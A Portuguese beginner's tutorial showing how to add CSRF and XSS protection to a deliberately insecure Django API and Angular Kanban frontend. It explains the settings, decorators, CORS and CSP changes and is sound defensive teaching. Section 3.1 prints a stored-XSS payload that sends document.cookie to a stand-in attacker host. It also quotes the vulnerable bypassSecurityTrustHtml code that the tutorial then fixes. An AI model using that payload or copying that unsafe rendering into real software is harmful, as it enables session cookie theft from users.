# Projeto02 — Tutorial: protegendo contra XSS e CSRF (partindo do Projeto01)

> Este é um tutorial passo a passo, escrito para quem **nunca programou em
> Python nem usou Django**. O objetivo é pegar o backend inseguro de
> propósito do [[Projeto01]] (`api01`) e mostrar, arquivo por arquivo, o que
> precisa mudar para ter proteção contra **CSRF** e **XSS** — do jeito que o
> [[Projeto02]] (`api02`) já implementa. Cada passo explica *o que* mudar,
> *onde* mudar e *por que* aquilo resolve o problema.
>
> Pré-requisito conceitual (autenticação, JWT, cookies): se esses termos
> ainda não fazem sentido, leia primeiro
> [[Projeto02/SegurancaAutorizacaoAcesso]] — este tutorial assume que você já
> sabe o que é um cookie `httpOnly` e por que o refresh token mora nele.

## 0. Antes de começar: dois ataques, duas explicações simples

Os dois ataques deste tutorial são frequentemente confundidos porque os
nomes parecem parecidos, mas atacam direções opostas:

- **CSRF (Cross-Site Request Forgery)** — um **site malicioso** faz o
  **navegador da vítima** enviar uma requisição para **a sua API**, sem a
  vítima perceber. Funciona porque o navegador manda cookies
  automaticamente para o domínio a que pertencem, não importa qual página
  disparou a requisição. Exemplo: a vítima está logada no seu sistema (tem
  o cookie de sessão/refresh guardado) e, em outra aba, abre
  `site-malicioso.com`, que tem escondido um `<form>` que envia
  `POST /api/logout` para o seu backend. O navegador manda o cookie
  junto, e seu backend aceita como se fosse a vítima pedindo o logout.
- **XSS (Cross-Site Scripting)** — um **atacante consegue rodar JavaScript
  dele dentro da sua própria página**, porque algum dado que ele controla
  (ex.: a descrição de uma tarefa) é inserido no HTML sem ser tratado como
  texto puro. Esse script roda com todos os poderes que o JavaScript
  legítimo da página teria: ler `document.cookie` (se não for `httpOnly`),
  chamar sua API em nome do usuário logado, redirecionar a página, etc.

A diferença chave: no CSRF, o código do atacante **nunca roda na sua
página** — ele só abusa do navegador enviando cookies automaticamente. No
XSS, o código do atacante **roda dentro da sua própria página**, com acesso
a tudo que um script legítimo teria.

## 1. Orientação: onde fica cada coisa no projeto Django

Se você nunca abriu um projeto Django, aqui está o mapa mínimo necessário
para seguir este tutorial (usando `api01`/`api02` como exemplo):

```
api01/
├── api01/
│   ├── settings.py     ← configuração global do projeto (middlewares, CORS, cookies...)
│   └── urls.py         ← lista de rotas do projeto inteiro
├── usuarios/
│   ├── views.py        ← funções que respondem às rotas de /api/usuarios, /api/login...
│   ├── urls.py          ← rotas específicas deste app
│   └── decorators.py   ← funções auxiliares reaproveitáveis (ex.: @jwt_required)
└── tarefas/
    ├── views.py         ← funções que respondem às rotas de /api/.../tarefas
    └── models.py        ← estrutura da tabela "tarefa" no banco
```

Dois conceitos que você vai ver repetidamente:

- **`settings.py`** — um arquivo Python com variáveis em MAIÚSCULAS
  (`MIDDLEWARE`, `CORS_ALLOW_CREDENTIALS`, etc.). Mudar um valor aqui muda o
  comportamento do projeto inteiro, sem precisar tocar em nenhuma view.
- **Decorator** (`@algumacoisa` escrito em cima de uma função) — é só uma
  função Python que "embrulha" outra função para adicionar um
  comportamento antes/depois dela rodar (ex.: `@csrf_exempt` diz "não exija
  CSRF nesta rota"; `@jwt_required` diz "exija um token válido antes de
  rodar esta view"). Você não precisa entender a implementação interna de
  um decorator para usá-lo — só saber que ele some ou aparece em cima da
  função que você quer afetar.

## 2. Parte A — Proteção contra CSRF

### 2.1 O que o Django já traz pronto

Django vem com uma proteção CSRF embutida chamada `CsrfViewMiddleware`.
Ela faz o seguinte em toda requisição que **muda estado** (`POST`, `PUT`,
`PATCH`, `DELETE`):

1. Gera um token aleatório e guarda num cookie.
2. Exige que a requisição mande esse mesmo token de volta por outro canal
   que **um site de terceiro não consegue forjar** (um header HTTP
   customizado, por exemplo) — porque um `<form>` escondido em outro site
   só consegue mandar cookies automaticamente, nunca ler o valor de um
   cookie de outro domínio para colocar num header.
3. Se o token do header não bater com o token esperado, rejeita a
   requisição com `403`.

O [[Projeto01]] **não tem** esse middleware ativado — é uma das
vulnerabilidades propositais documentadas em
[[Projeto01/Vulnerabilidades]]. Vamos ativar.

### 2.2 Passo 1 — Ativar o middleware

**Arquivo**: `api01/api01/settings.py`

Abra a lista `MIDDLEWARE` e adicione a linha do CSRF **depois** de
`SessionMiddleware` e **antes** de `AuthenticationMiddleware` (essa ordem
importa porque cada middleware depende do anterior já ter rodado):

```python
# Antes (Projeto01):
MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'corsheaders.middleware.CorsMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
]
```

```python
# Depois (Projeto02):
MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'corsheaders.middleware.CorsMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',   # ← linha nova
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
]
```

A partir deste momento, **toda** rota `POST`/`PUT`/`PATCH`/`DELETE` do
projeto passa a exigir o token CSRF — inclusive rotas que não deveriam
precisar dele (ver próximo passo).

### 2.3 Passo 2 — Decidir quais rotas realmente precisam de CSRF

CSRF só é um risco **quando o navegador manda a credencial automaticamente**
— ou seja, quando a rota se autentica por **cookie**. Rotas que exigem o
header `Authorization: Bearer <token>` não têm esse risco, porque nenhum
site de terceiro consegue forçar o navegador da vítima a adicionar um
header customizado numa requisição — só JavaScript rodando na sua própria
origem consegue fazer isso.

No [[Projeto02]], só três rotas dependem do cookie do refresh token:

| Rota | Arquivo | Usa cookie? | Precisa de CSRF? |
|---|---|---|---|
| `POST /api/login` | `usuarios/views.py` (`login`) | Só **recebe** o cookie na resposta, não lê nenhum cookie para autenticar a si mesma | Não — mas precisa **gerar** o cookie CSRF para as próximas chamadas (ver passo 2.4) |
| `POST /api/token/refresh` | `usuarios/views.py` (`token_refresh`) | Sim, lê `request.COOKIES['refresh_token']` | **Sim** |
| `POST /api/logout` | `usuarios/views.py` (`logout`) | Sim, lê o cookie para revogar | **Sim** |
| Todas as rotas de `tarefas/views.py`, `cadastrar_usuario`, `listar_usuarios` | — | Autenticam via header `Authorization`, não por cookie | Não |

Isso significa: **a maioria das rotas continua com `@csrf_exempt`**, mas
`token_refresh` e `logout` perdem esse decorator.

**Arquivo**: `api01/usuarios/views.py`

```python
# Antes (Projeto01 não tinha estas rotas — elas são novas no Projeto02,
# mas é exatamente aqui que o cuidado precisa entrar ao criá-las):

@csrf_exempt                      # ← ERRADO para uma rota que lê cookie
@require_http_methods(['POST'])
def token_refresh(request):
    ...
```

```python
# Depois (Projeto02): sem @csrf_exempt, o CsrfViewMiddleware passa a exigir
# o token CSRF nesta rota.
@require_http_methods(['POST'])
def token_refresh(request):
    ...
```

O mesmo vale para `logout` — basta **não** colocar `@csrf_exempt` nela.

> **Regra prática para decorar uma rota nova**: pergunte "esta rota lê
> algum cookie para autenticar/identificar o usuário?". Se sim, **não** use
> `@csrf_exempt`. Se a única credencial é o header `Authorization`, use
> `@csrf_exempt` (porque o CSRF não se aplica, e exigir o token só
> adicionaria fricção sem ganho de segurança).

### 2.4 Passo 3 — Garantir que o cookie CSRF seja criado

O middleware só gera o cookie CSRF numa resposta se alguma view "pedir"
isso explicitamente (ou se um template renderizar `{% csrf_token %}`, o
que não é o caso de uma API JSON). Para uma API, o jeito de pedir é o
decorator `@ensure_csrf_cookie`, colocado na rota de login — é ali que o
frontend normalmente faz a primeira chamada autenticada da sessão:

**Arquivo**: `api01/usuarios/views.py`

```python
from django.views.decorators.csrf import csrf_exempt, ensure_csrf_cookie

@csrf_exempt
@ensure_csrf_cookie        # ← linha nova: força o Set-Cookie do token CSRF
@require_http_methods(['POST'])
def login(request):
    ...
```

Por que `login` continua `@csrf_exempt` **e** ganha `@ensure_csrf_cookie`
ao mesmo tempo: a própria chamada de login não lê nenhum cookie para se
autenticar (então não há CSRF a proteger nela), mas é o momento certo de
*emitir* o cookie CSRF que vai proteger as chamadas futuras
(`token_refresh`, `logout`).

### 2.5 Passo 4 — Configurar nomes de cookie/header e origens confiáveis

**Arquivo**: `api01/api01/settings.py`

Por padrão, o Django usa os nomes `csrftoken` (cookie) e
`X-CSRFToken` (header), e o cookie CSRF, por padrão, não pode ser lido por
JavaScript. Isso não funciona aqui: é o **próprio frontend** (Angular) que
precisa ler o valor do cookie para devolvê-lo no header — então o cookie
não pode ser `httpOnly` neste caso específico (diferente do refresh token,
que *tem* que ser `httpOnly`). Adicione:

```python
# Nomes compatíveis com o cliente HttpClient do Angular (que por padrão lê
# um cookie chamado XSRF-TOKEN e devolve no header X-XSRF-TOKEN).
CSRF_COOKIE_NAME = 'XSRF-TOKEN'
CSRF_HEADER_NAME = 'HTTP_X_XSRF_TOKEN'   # Django antepõe "HTTP_" e troca "-" por "_"

# Tem que ser legível por JavaScript — é o Angular quem lê este cookie
# para devolver o valor no header. Diferente do cookie do refresh token,
# que deve continuar httponly=True.
CSRF_COOKIE_HTTPONLY = False
CSRF_COOKIE_SECURE = not DEBUG   # True em produção (exige HTTPS)
CSRF_COOKIE_SAMESITE = 'Lax'

# Lista de origens autorizadas a mandar o header CSRF de volta — sem isso,
# o Django rejeita a requisição mesmo com o header correto.
CSRF_TRUSTED_ORIGINS = ['http://localhost:4200']
```

E, como o front e o back estão em origens diferentes (`localhost:4200` vs.
`localhost:8000`), o CORS também precisa permitir cookies e o header
customizado — sem isso, o navegador bloqueia a requisição antes mesmo de
ela chegar ao Django:

```python
from corsheaders.defaults import default_headers

# Antes (Projeto01): CORS_ALLOW_ALL_ORIGINS = True
# Depois (Projeto02): lista explícita — "allow all" não pode coexistir com
# cookies (o navegador recusa enviar credenciais numa resposta CORS que
# libera "*").
CORS_ALLOWED_ORIGINS = ['http://localhost:4200']
CORS_ALLOW_CREDENTIALS = True
CORS_ALLOW_HEADERS = list(default_headers) + ['x-xsrf-token']
```

### 2.6 Passo 5 — Testar

Depois de aplicar os passos acima, teste assim:

```bash
# 1. Login sem token CSRF ainda existe: deve funcionar normalmente e
#    devolver um Set-Cookie: XSRF-TOKEN=...
curl -i -c cookies.txt -X POST http://localhost:8000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"a@a.com","senha":"123"}'

# 2. Chamar /api/token/refresh SEM o header do CSRF: deve responder 403.
curl -i -b cookies.txt -X POST http://localhost:8000/api/token/refresh

# 3. Chamar de novo, agora lendo o valor do cookie XSRF-TOKEN salvo em
#    cookies.txt e mandando no header: deve responder 200.
curl -i -b cookies.txt -X POST http://localhost:8000/api/token/refresh \
  -H "X-XSRF-TOKEN: <valor do cookie XSRF-TOKEN em cookies.txt>"
```

Se o passo 2 retornar `403 Forbidden` e o passo 3 retornar `200 OK`, a
proteção está funcionando.

## 3. Parte B — Proteção contra XSS

### 3.1 Por que o backend Python, por si só, não resolve XSS aqui

Diferente do CSRF — que se resolve quase inteiramente em `settings.py` e
`views.py` — a vulnerabilidade de XSS deste projeto está **no frontend**,
não no backend: a descrição da tarefa é salva e devolvida como texto puro
pela API (`tarefas/views.py`), e é o **Angular** quem decide inserir esse
texto como HTML na página:

**Arquivo**: `client01/src/app/pages/kanban/kanban.component.ts`

```ts
// VULNERABILIDADE: desliga o sanitizador do Angular para a descrição,
// tratando texto digitado pelo usuário como HTML confiável.
descricaoHtml(tarefa: Tarefa): SafeHtml {
  return this.sanitizer.bypassSecurityTrustHtml(tarefa.descricao);
}
```

**Arquivo**: `client01/src/app/pages/kanban/kanban.component.html`

```html
<p [innerHTML]="descricaoHtml(tarefa)"></p>
```

Se alguém criar uma tarefa com descrição
`<img src=x onerror="fetch('https://atacante.com/roubo?c='+document.cookie)">`,
esse HTML é inserido literalmente na página de **qualquer pessoa** que
visualizar aquela tarefa (inclusive um admin) — é um **XSS armazenado**:
o payload malicioso fica salvo no banco e executa para todo mundo que
abrir aquele cartão do Kanban.

O Python/Django por si só não consegue impedir isso, porque o problema não
é como o dado é armazenado ou transportado — é a **decisão do frontend de
renderizar esse dado como HTML em vez de texto**. Ainda assim, há coisas
legítimas que o backend Python deve (e pode) fazer, descritas a seguir.

### 3.2 Correção principal: parar de confiar no frontend

**Arquivo**: `client01/src/app/pages/kanban/kanban.component.ts` e
`.html`

A correção é remover `bypassSecurityTrustHtml` e `[innerHTML]`, e deixar o
Angular fazer o que ele já faz por padrão: tratar qualquer valor
interpolado com `{{ }}` como **texto**, escapando automaticamente
caracteres como `<`, `>` e `&` antes de inserir no DOM.

```ts
// Depois: nenhum método "descricaoHtml" nem import de DomSanitizer/SafeHtml.
// A descrição some do component.ts — não precisa de tratamento especial.
```

```html
<!-- Depois: interpolação simples, sempre tratada como texto pelo Angular. -->
<p>{{ tarefa.descricao }}</p>
```

Isso sozinho já neutraliza o ataque descrito acima: o `<img ...>` digitado
pelo usuário passa a aparecer na tela **como texto literal**
(`<img src=x onerror="...">`), nunca como uma tag HTML que o navegador
interpreta e executa.

> Por que isto não é "código Python": XSS nesta aplicação é,
> estruturalmente, um problema de *onde o dado é renderizado como HTML*,
> não de onde ele é armazenado. Como o backend aqui é uma API JSON pura
> (nunca gera HTML para o usuário final), a defesa real mora no código que
> *constrói o HTML* — o Angular. O papel do Python é o descrito nos itens
> 3.3 a 3.5: reduzir o estrago possível, nunca piorar o problema, e nunca
> ser o único lugar em que a confiança é depositada.

### 3.3 O que o Python/Django precisa **nunca** fazer (para não piorar o XSS)

Mesmo sem "resolver" o XSS, há práticas no backend que, se violadas,
tornam o problema muito piora. Ao escrever uma view nova, confirme:

- **Nunca usar `django.utils.safestring.mark_safe()` (ou o filtro
  `|safe` em um template) sobre texto que vem do usuário.** Essas
  funções dizem ao Django "não escape este texto, já é HTML seguro" — se o
  conteúdo vem de um campo preenchido por qualquer usuário (nome,
  descrição, comentário...), isso recria exatamente o mesmo problema do
  `bypassSecurityTrustHtml` do Angular, agora no lado do servidor. Nenhuma
  view deste projeto usa `mark_safe`/`|safe` hoje — mantenha assim.
- **Nunca montar HTML por concatenação de string com dado do usuário**,
  por exemplo `f"<p>{descricao}</p>"` dentro de uma view que devolve
  `HttpResponse` em vez de `JsonResponse`. Este projeto devolve só JSON
  (`JsonResponse`), o que já evita essa armadilha por construção — mas é
  importante saber *por que* continuar devolvendo JSON e nunca HTML
  montado manualmente a partir de entrada do usuário.
- **Se qualquer view, no futuro, passar a renderizar um template Django
  (`django.shortcuts.render`) com dado do usuário**, confie no
  comportamento padrão do motor de templates: `{{ variavel }}` já escapa
  HTML automaticamente (`autoescape` vem `True` por padrão). Só desative
  isso (`{% autoescape off %}` ou `|safe`) se tiver absoluta certeza de que
  o conteúdo não vem, direta ou indiretamente, de um usuário.

### 3.4 Defesa em profundidade que o Python *pode* adicionar: Content-Security-Policy

Mesmo depois de corrigir o Angular (seção 3.2), é uma boa prática de
"defesa em profundidade" (uma segunda camada, caso a primeira falhe de
novo no futuro por um bug) mandar um cabeçalho HTTP
`Content-Security-Policy` (CSP), que instrui o **navegador** a não
executar/carregar certos tipos de conteúdo, mesmo que ele apareça na
página. Isso é configurado inteiramente no lado Python, sem precisar
tocar no Angular.

Um **middleware** próprio e simples resolve isso. Crie o arquivo:

**Arquivo novo**: `api01/api01/security_headers.py`

```python
def content_security_policy_middleware(get_response):
    def middleware(request):
        resposta = get_response(request)
        # 'self' = só carrega/executa recursos que vêm da própria origem da
        # API. Isso não impede o XSS de aparecer como texto (isso é
        # trabalho do Angular, seção 3.2), mas limita o estrago de um script
        # injetado que sobreviva a qualquer ponto cego futuro: ele não
        # conseguiria carregar JavaScript de um domínio externo, por
        # exemplo.
        resposta['Content-Security-Policy'] = "default-src 'self'"
        return resposta
    return middleware
```

E registre em `MIDDLEWARE`, em `api01/api01/settings.py` (pode ir no
final da lista):

```python
MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'corsheaders.middleware.CorsMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'api01.security_headers.content_security_policy_middleware',  # ← linha nova
]
```

**Importante**: CSP é uma camada **adicional**, não um substituto da
correção da seção 3.2. Um CSP mal configurado (por exemplo, liberando
`'unsafe-inline'` para scripts) não bloqueia o ataque descrito acima; e,
mesmo bem configurado, ele reduz o *impacto* de um XSS futuro, mas não
impede o HTML malicioso de aparecer na tela como texto malformado.

### 3.5 O que validar no backend, mesmo sem ser "a" correção

Mesmo sabendo que a correção real é no Angular, ao escrever
`tarefas/views.py` ou `usuarios/views.py`, vale manter estas práticas,
úteis contra outros tipos de abuso além de XSS:

- **Limitar o tamanho de campos de texto livre** (`descricao`, `nome`) no
  `models.py`, com `max_length` sensato, para reduzir a superfície de
  payloads muito grandes.
- **Nunca decidir "sanitizar" o HTML no backend e confiar que isso basta**
  — bibliotecas de sanitização de HTML (ex.: `bleach`) existem e podem ser
  usadas como camada adicional se um dia a aplicação precisar *de fato*
  aceitar HTML rico do usuário (um editor de texto formatado, por
  exemplo). Mas, para este projeto — que não precisa de HTML rico em
  nenhum campo — a resposta correta é simplesmente **nunca renderizar
  esses campos como HTML** (seção 3.2), não tentar limpar HTML perigoso.

## 4. Resumo: arquivos tocados

| Arquivo | O que muda | Proteção |
|---|---|---|
| `api01/api01/settings.py` | Adiciona `CsrfViewMiddleware` em `MIDDLEWARE`; configura `CSRF_COOKIE_NAME`, `CSRF_HEADER_NAME`, `CSRF_COOKIE_HTTPONLY`, `CSRF_TRUSTED_ORIGINS`; troca `CORS_ALLOW_ALL_ORIGINS` por `CORS_ALLOWED_ORIGINS` + `CORS_ALLOW_CREDENTIALS` + `CORS_ALLOW_HEADERS` | CSRF |
| `api01/usuarios/views.py` | Remove `@csrf_exempt` de `token_refresh` e `logout`; adiciona `@ensure_csrf_cookie` em `login` | CSRF |
| `api01/api01/security_headers.py` (novo) | Middleware simples que adiciona o cabeçalho `Content-Security-Policy` | XSS (defesa em profundidade) |
| `client01/src/app/pages/kanban/kanban.component.ts` | Remove `bypassSecurityTrustHtml`/`DomSanitizer`/`SafeHtml` | XSS (correção real) |
| `client01/src/app/pages/kanban/kanban.component.html` | Troca `[innerHTML]="descricaoHtml(tarefa)"` por `{{ tarefa.descricao }}` | XSS (correção real) |
| `client01/src/app/app.config.ts` | Adiciona `withXsrfConfiguration({ cookieName: 'XSRF-TOKEN', headerName: 'X-XSRF-TOKEN' })` ao `provideHttpClient` | CSRF (lado do cliente) |

## 5. Checklist final

- [ ] `CsrfViewMiddleware` está em `MIDDLEWARE`, na posição correta.
- [ ] Toda rota que lê um cookie para se autenticar (`token_refresh`,
      `logout`) **não** tem `@csrf_exempt`.
- [ ] A rota de `login` tem `@ensure_csrf_cookie` para emitir o cookie
      CSRF no início da sessão.
- [ ] `CSRF_COOKIE_NAME`/`CSRF_HEADER_NAME` batem com o que o frontend
      espera (`withXsrfConfiguration` no Angular).
- [ ] `CORS_ALLOW_CREDENTIALS = True` e `CORS_ALLOWED_ORIGINS` lista
      origens explícitas (nunca `CORS_ALLOW_ALL_ORIGINS = True` junto com
      cookies).
- [ ] Nenhuma view usa `mark_safe()`/`|safe` sobre dado vindo do usuário.
- [ ] Nenhum campo de texto do usuário é inserido como HTML no frontend
      (`[innerHTML]`, `bypassSecurityTrustHtml` ou equivalentes em outros
      frameworks) — sempre interpolação de texto simples.
- [ ] Um cabeçalho `Content-Security-Policy` está configurado como camada
      extra, mas não é tratado como a correção principal do XSS.

## Ver também

- [[Projeto01/Vulnerabilidades]] — descreve o XSS armazenado e a ausência
  de CSRF como vulnerabilidades propositais herdadas do [[Projeto00]].
- [[Projeto02/SegurancaAutorizacaoAcesso]] (seção 7.3) — explica o
  trade-off entre XSS e CSRF ao decidir onde guardar tokens, contexto que
  motiva por que `api02` precisa de ambas as proteções ao mesmo tempo.
- `Documentação/OWASP Top 10/` — XSS e CSRF na classificação OWASP vigente.
